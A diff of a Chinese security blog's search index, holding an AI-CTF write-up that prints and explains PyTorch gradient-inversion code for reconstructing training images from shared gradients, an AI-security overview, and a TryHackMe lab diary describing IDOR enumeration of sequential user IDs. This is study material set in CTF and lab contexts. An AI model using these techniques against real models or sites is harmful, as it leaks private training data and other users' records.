nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
+<p>根据出题人给出的exp，尝试运行，但实际恢复效果却不太好？</p>
+<p>这边对每一部分代码进行解释</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br></pre></td></tr></table></figure>
+<p>这里初识化定义了一个卷积神经网络模型LeNet，在原论文中除了LeNet网络模型，还有一种为Resnet，暂时先对这一种进行理解。序列里包含了四个卷积层，每个卷积层后面跟着一个 Sigmoid 激活函数。每个卷积层使用 5x5 的卷积核，具有不同的步长 (<code>stride</code>) 和池化(<code>padding</code>)。</p>
+<p>然后包含一个线性全连接层，输入特征数为 768（由前面的卷积层产生）和输出特征数为 200。通过这个全连接层，网络将图像的特征映射到一个 200 维的空间，通常用于图像分类及特征提取。</p>
+<p>其中forward方法定义了数据在通过模型时的前向传播过程，输入数据 <code>x</code> 经过卷积层处理，然后被拉直成一维向量，最后经过全连接层 得到最终输出。</p>
+<p>criterion 函数定义了交叉熵损失函数，用于衡量模型输出与目标标签之间的差异。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br></pre></td></tr></table></figure>
+<p>这里的两行主要是进行图像转换的一些操作，第一行用于图像转换为张量，第二行用于张量转换为图像，即图像的预处理和后处理。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>使用计算机cuda进行计算，以及对模型和张量数据的导入处理</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p><code>torch.manual_seed(0)</code> 的作用是设置 PyTorch 中的随机数生成器的种子为 0，相同的随机数种子将产生相同的随机数序列。而在这种攻击方法中，有涉及到伪标签和伪数据的初始化，所以设置seed种子，尽可能保证生成的相似性。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这一段是论文思想的核心重点就是创建dummy_data,dummy_label所得到的梯度与原始训练数据所得到的梯度的均方误差，再用损失函数对dummy_data,dummy_label最优化，不断迭代以恢复出原始数据，但是可能也就是这里存在问题，使得我实际得到的图像效果不佳，但暂时还没确定问题的原因。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">       plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">       plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">       plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">       plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">   plt.show()</span><br></pre></td></tr></table></figure>
+<p>这一段就是将所优化后的数据进行可视化操作，以达成数据恢复的目的</p>
+<p>然后根据相关资料找了一个改进的攻击方法</p>
+]]></content>
+      <categories>
+        <category>AI</category>
+        <category>AI-CTF</category>
+      </categories>
+      <tags>
+        <tag>2022*CTF</tag>
+        <tag>AI</tag>
       </tags>
   </entry>
   <entry>
@@ -996,32 +996,6 @@
       </tags>
   </entry>
   <entry>
-    <title>AI-安全（1）总述</title>
-    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
-    <content><![CDATA[<h1>AI安全</h1>
-<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
-<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
-<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
-<p>这是引用的其中的一段话：</p>
-<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
-<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
-<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
-<p>学习心得及相关记录如下：</p>
-<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
-<p>AI相关CTF赛题：</p>
-<p><a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
-<p><a href="https://wh1tej0ker.github.io/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/">AI-CTF（2）LeNet | Wh1teJ0ker</a></p>
-<p><a href="https://wh1tej0ker.github.io/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/">AI-CTF（3）network-in-network | Wh1teJ0ker</a></p>
-]]></content>
-      <categories>
-        <category>AI</category>
-        <category>AI安全</category>
-      </categories>
-      <tags>
-        <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AI-安全（2）梯度泄露攻击</title>
     <url>/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h1>梯度泄露攻击</h1>
@@ -1169,6 +1143,32 @@
       </categories>
       <tags>
         <tag>信息搜集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AI-安全（1）总述</title>
+    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
+    <content><![CDATA[<h1>AI安全</h1>
+<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
+<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
+<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
+<p>这是引用的其中的一段话：</p>
+<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
+<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
+<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
+<p>学习心得及相关记录如下：</p>
+<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
+<p>AI相关CTF赛题：</p>
+<p><a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
+<p><a href="https://wh1tej0ker.github.io/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/">AI-CTF（2）LeNet | Wh1teJ0ker</a></p>
+<p><a href="https://wh1tej0ker.github.io/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/">AI-CTF（3）network-in-network | Wh1teJ0ker</a></p>
+]]></content>
+      <categories>
+        <category>AI</category>
+        <category>AI安全</category>
+      </categories>
+      <tags>
+        <tag>AI</tag>
       </tags>
   </entry>
   <entry>
@@ -2188,6 +2188,37 @@ FFI是PHP中调用C代码的手段
       </tags>
   </entry>
   <entry>
+    <title>Tryhackme_Diary-2</title>
+    <url>/2024/02/22/Tryhackme_Diary-2/</url>
+    <content><![CDATA[<h1>Tryhackme_Diary-2</h1>
+<h2 id="Introduction-to-Offensive-Security">Introduction to Offensive Security</h2>
+<h3 id="Web-Application-Security">Web Application Security</h3>
+<h4 id="Introduction">Introduction</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个人都在自己的计算机上使用不同的程序。一般来说，程序在我们的计算机上运行，利用我们计算机的处理能力和存储空间。而且，要使用一个程序，我们需要先安装它。但是如果我们可以在不安装的情况下使用任何程序呢？</span><br><span class="line"></span><br><span class="line">网络应用就像一个“程序”，只要我们有现代标准的网络浏览器，比如Firefox、Safari或Chrome，我们就可以使用它。因此，与其安装每个你需要的程序，你只需要浏览相关的页面。以下是一些网络应用的例子：</span><br><span class="line"></span><br><span class="line">- 网络邮件，比如Tutanota、Protonmail、Outlook和Gmail</span><br><span class="line">- 在线办公套件，如Microsoft Office 365（Word、Excel和PowerPoint）、Google Drive（Docs、Sheets和Slides）和Zoho Office（Writer、Sheet和Show）</span><br><span class="line">- 网上购物，如Amazon.com、AliExpress和Etsy</span><br><span class="line">成千上万的其他例子提供了各种各样的服务。其他例子包括在线银行业务、货币转账、天气预报和社交媒体。</span><br><span class="line"></span><br><span class="line">网络银行业务网络应用</span><br><span class="line"></span><br><span class="line">网络应用的概念是它是运行在远程服务器上的程序。服务器是指持续运行以“为客户服务”的计算机系统。在这种情况下，服务器将运行一种特定类型的程序，可以通过网络浏览器访问。</span><br><span class="line"></span><br><span class="line">考虑一个在线购物应用程序。网络应用程序将从数据库服务器读取有关产品及其详细信息的数据。数据库用于以有组织的方式存储信息。例如，关于产品、客户和发票的信息。数据库服务器负责许多功能，包括读取、搜索和写入数据库。在线购物网络应用可能需要访问一个以上的数据库，例如：</span><br><span class="line"></span><br><span class="line">- 产品数据库：这个数据库包含产品的详细信息，如名称、图片、规格和价格。</span><br><span class="line">- 客户数据库：它包含与客户相关的所有详细信息，如姓名、地址、电子邮件和电话号码。</span><br><span class="line">- 销售数据库：我们希望在这个数据库中看到每个客户购买了什么以及他们是如何支付的。</span><br><span class="line"></span><br><span class="line">我们已经看到了任何在线购物系统中存储的大量信息。假设攻击者成功地利用了网络应用程序并窃取了客户数据库，这将给公司和其客户带来重大损失。</span><br><span class="line"></span><br><span class="line">下面的图像显示了在在线购物网站上搜索商品的过程。在最简单的版本中，搜索将分为四个步骤：</span><br><span class="line"></span><br><span class="line">- 用户在搜索栏中输入商品名称或相关关键字。网络浏览器将搜索关键字发送到在线购物网络应用程序。</span><br><span class="line">- 网络应用程序查询（搜索）提交的关键字的产品数据库。</span><br><span class="line">- 产品数据库将匹配所提供的关键字的搜索结果返回给网络应用程序。</span><br><span class="line">- 网络应用程序将结果格式化为友好的网页并返回给用户。</span><br><span class="line"></span><br><span class="line">从用户的角度来看，他们只会访问一个优雅的在线商店，所有的技术基础设施都是隐藏的。</span><br><span class="line"></span><br><span class="line">访问网络应用程序时，技术基础设施被隐藏起来</span><br><span class="line"></span><br><span class="line">许多公司提供漏洞赏金计划。漏洞赏金计划允许公司为发现其系统中的安全漏洞（弱点）的任何人提供奖励。主要条件是找到的漏洞必须在漏洞赏金范围和规则内。谷歌、微软和Facebook等公司都有漏洞赏金计划。发现一个漏洞可以让你赚取从几百美元到数万美元不等的奖金，具体取决于漏洞的严重程度，也就是你发现的弱点。</span><br></pre></td></tr></table></figure>
+<h4 id="Web-Application-Security-Risks">Web Application Security Risks</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设您想要从一个在线商店购买商品。在这个 Web 应用程序上，您期望能够执行一些特定的功能。最直接的情况下，在线订购可能会按照以下步骤进行：</span><br><span class="line"></span><br><span class="line">1. 在网站上登录。 2. 搜索产品。 3. 将产品添加到购物车中。 4. 指定送货地址。 5. 提供支付详情。</span><br><span class="line"></span><br><span class="line">针对 Web 应用程序的攻击主要有几个常见的类别。考虑以下步骤及相关的攻击。</span><br><span class="line"></span><br><span class="line">在网站上登录：攻击者可以尝试通过尝试许多密码来发现密码。攻击者会使用一个长列表的密码和自动化工具来测试它们与登录页面的匹配情况。</span><br><span class="line"></span><br><span class="line">搜索产品：攻击者可以尝试通过在搜索词中添加特定字符和代码来突破系统。攻击者的目标是使目标系统返回它不应该返回的数据或执行它不应该执行的程序。</span><br><span class="line"></span><br><span class="line">提供支付详情：攻击者会检查支付详情是否以明文形式发送或使用弱加密。加密是指使数据在不知道密钥或密码的情况下无法读取。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们无法涵盖所有内容，但我们将介绍 OWASP 十大的一些正式类别。如果这些技术对您来说听起来有些陌生，请不用担心；TryHackMe 将向您介绍每个漏洞。</span><br><span class="line"></span><br><span class="line">识别和身份验证失败：识别指的是唯一识别用户的能力。而身份验证则指的是证明用户是其所声称的人的能力。在线商店必须在用户使用系统之前确认用户的身份并对其进行身份验证。然而，这一步骤容易受到不同类型的弱点的影响。例如：</span><br><span class="line"></span><br><span class="line">允许攻击者使用暴力破解，即使用自动化工具尝试许多密码以查找有效的登录凭据。</span><br><span class="line"></span><br><span class="line">允许用户选择弱密码。弱密码通常容易被猜到。</span><br><span class="line"></span><br><span class="line">以明文形式存储用户的密码。如果攻击者成功读取包含密码的文件，我们不希望他们能够了解存储的密码。</span><br><span class="line"></span><br><span class="line">损坏的访问控制：访问控制确保每个用户只能访问与其角色或工作相关的文件（文档、图像等）。例如，您不希望市场部门的某人访问（阅读）财务部门的文档。与访问控制相关的示例漏洞包括：</span><br><span class="line"></span><br><span class="line">未能应用最小权限原则，并给予用户比他们需要的更多的访问权限。例如，一个在线客户应该能够查看商品的价格，但他们不应该能够更改商品价格。</span><br><span class="line"></span><br><span class="line">通过使用其唯一标识符查看或修改其他人的帐户。例如，您不希望一个银行客户能够查看另一个客户的交易。</span><br><span class="line"></span><br><span class="line">能够以未经身份验证的用户的身份浏览需要身份验证（登录）的页面。例如，我们不能让任何人在登录前查看网络邮件。</span><br><span class="line"></span><br><span class="line">注入：注入攻击是指 Web 应用程序中的漏洞，其中用户可以将恶意代码作为其输入的一部分插入。此漏洞的一个原因是对用户输入的验证和清理不足。</span><br><span class="line"></span><br><span class="line">密码学失败：这个类别与密码学有关的失败。密码学关注的是数据的加密和解密过程。加密将明文转换为密文，对于没有密钥解密的人来说，密文应该是无法理解的。换句话说，加密确保没有人能够在不知道密钥的情况下读取数据。解密使用密钥将密文转换回原始明文。密码学失败的</span><br><span class="line"></span><br><span class="line">示例包括：</span><br><span class="line"></span><br><span class="line">以明文形式发送敏感数据，例如使用 HTTP 而不是 HTTPS。HTTP 是访问 Web 的协议，而 HTTPS 是 HTTP 的安全版本。其他人可以读取您通过 HTTP 发送的所有内容，但不能读取 HTTPS。</span><br><span class="line"></span><br><span class="line">依赖弱密码算法。一个旧的密码算法是将每个字母向后移动一位。例如，“TRY HACK ME” 变成 “USZ IBDL NF”。这个密码算法很容易被破解。</span><br><span class="line"></span><br><span class="line">对密码学函数使用默认或弱密钥。使用 1234 作为密钥的加密很容易被破解。</span><br><span class="line"></span><br><span class="line">这张图显示了一名顾客在线使用她的信用卡，信用卡号以明文形式发送。</span><br><span class="line"></span><br><span class="line">如果这些技术起初看起来有些复杂或高级，请不用担心。TryHackMe 专门提供了深入的房间，帮助您理解和实验针对 Web 应用程序的各种攻击。</span><br></pre></td></tr></table></figure>
+<h4 id="Practical-Example-of-Web-Application-Security">Practical Example of Web Application Security</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此任务将调查一个使用不安全的直接对象引用（IDOR）的易受攻击的网站。IDOR属于破坏访问控制的范畴。破坏访问控制意味着攻击者可以访问未针对他们的信息或执行未经授权的操作。考虑这样一个情况，一个 Web 服务器接收用户提供的输入来检索对象（文件、数据、文档），并且它们按顺序编号。假设用户有权限访问名为 IMG_1003.JPG 的照片。我们可能会猜到还有 IMG_1002.JPG 和 IMG_1004.JPG; 但是，即使我们弄清了它的名称，Web 应用程序也不应该提供给我们那张照片。通常，如果对输入数据放置了太多的信任，就会出现IDOR漏洞。换句话说，Web 应用程序不会验证用户是否有权限访问请求的对象。</span><br><span class="line"></span><br><span class="line">仅仅提供用户或产品的正确 URL 并不一定意味着用户应该能够访问该 URL。例如，考虑产品页面 https://store.tryhackme.thm/products/product?id=52。我们可以期望这个 URL 提供有关产品编号 52 的详细信息。在数据库中，项目将按顺序分配编号。攻击者将尝试其他数字，例如 51 或 53，而不是 52; 如果 Web 应用程序容易受到攻击，这可能会显示其他已退休或未发布的产品。</span><br><span class="line"></span><br><span class="line">让我们考虑一个更为关键的例子；URL https://store.tryhackme.thm/customers/user?id=16 将返回 id=16 的用户。同样，我们期望用户具有顺序编号。攻击者将尝试其他数字，并可能访问其他用户帐户。这种漏洞可能适用于顺序文件；例如，如果攻击者看到 007.txt，那么攻击者可能会尝试其他数字，例如 001.txt、006.txt 和 008.txt。同样，如果您是编号为 16 的ID，而编号为 17 的ID是另一个用户，通过将ID更改为 17，您可以看到属于另一个用户的敏感数据。同样，他们可以将ID更改为 16，并查看属于您的敏感数据。（当然，我们在这里假设系统容易受到IDOR攻击。）</span><br><span class="line"></span><br><span class="line">点击“查看站点”，让我们看看它是如何运作的。您将看到一个显示库存管理系统的页面。如果您点击“计划发货”选项卡，您会发现攻击者已经在破坏计划中成功地混淆了事情。请注意，他们将错误的轮胎发送到每条生产线上；例如，他们将摩托车轮胎和摩托车轮胎分配给了自行车装配！如果不加修复，所有轮胎都将错误地发送到错误的装配线。</span><br><span class="line"></span><br><span class="line">我们将黑客系统并撤消攻击者的步骤。在“您的活动”中，您可以看到一个用户的活动。我们有理由相信这个网站有IDOR漏洞。</span><br></pre></td></tr></table></figure>
+<p>这一块就是介绍了一个简单的用户遍历，通过get请求可以直接通过相关编号修改去实现用户遍历，最后还原即得flag</p>
+<p><img src="https://s2.loli.net/2024/02/23/KQwURGOTarhvCYB.png" alt="Tryhackme_2_1"></p>
+<h2 id="Introduction-to-Defensive-Security">Introduction to Defensive Security</h2>
+<h3 id="Intro-to-Digital-Forensics">Intro to Digital Forensics</h3>
+<h4 id="Introduction-To-Digital-Forensics">Introduction To Digital Forensics</h4>
